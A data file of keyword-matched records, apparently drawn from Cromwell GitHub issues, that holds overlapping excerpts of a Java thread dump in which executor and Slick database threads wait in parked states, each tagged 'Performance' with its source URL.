akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorker",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4004:3677,concurren,concurrent,3677,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4004,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArray",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:15141,concurren,concurrent,15141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:14263,concurren,concurrent,14263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:13385,concurren,concurrent,13385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:12507,concurren,concurrent,12507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Thread",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:11629,concurren,concurrent,11629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00000001316a4000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-9"" #48 daemon prio=5 os_prio=31 tid=0x00007fb76b529800 nid=0x8903 waiting on condition [0x00000001315a1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:28334,concurren,concurrent,28334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00000001317a7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-10"" #49 daemon prio=5 os_prio=31 tid=0x00007fb7720cd800 nid=0x8b03 waiting on condition [0x00000001316a4000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:27258,concurren,concurrent,27258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00000001318aa000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-11"" #50 daemon prio=5 os_prio=31 tid=0x00007fb7720ce800 nid=0x8d03 waiting on condition [0x00000001317a7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:26182,concurren,concurrent,26182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00000001319ad000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-12"" #51 daemon prio=5 os_prio=31 tid=0x00007fb7720cf000 nid=0x8f03 waiting on condition [0x00000001318aa000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:25106,concurren,concurrent,25106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x0000000131ab0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-13"" #52 daemon prio=5 os_prio=31 tid=0x00007fb76e96e000 nid=0x9103 waiting on condition [0x00000001319ad000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:24030,concurren,concurrent,24030,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x0000000131bb3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-14"" #53 daemon prio=5 os_prio=31 tid=0x00007fb77061e000 nid=0x9303 waiting on condition [0x0000000131ab0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:22954,concurren,concurrent,22954,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-16"" #55 daemon prio=5 os_prio=31 tid=0x00007fb76e92f000 nid=0x9703 waiting on condition [0x0000000131cb6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-15"" #54 daemon prio=5 os_prio=31 tid=0x00007fb76b6b4000 nid=0x9503 waiting on condition [0x0000000131bb3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:21878,concurren,concurrent,21878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"ynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-18"" #58 daemon prio=5 os_prio=31 tid=0x00007fb770630800 nid=0x9d03 waiting on condition [0x00000001323d9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at 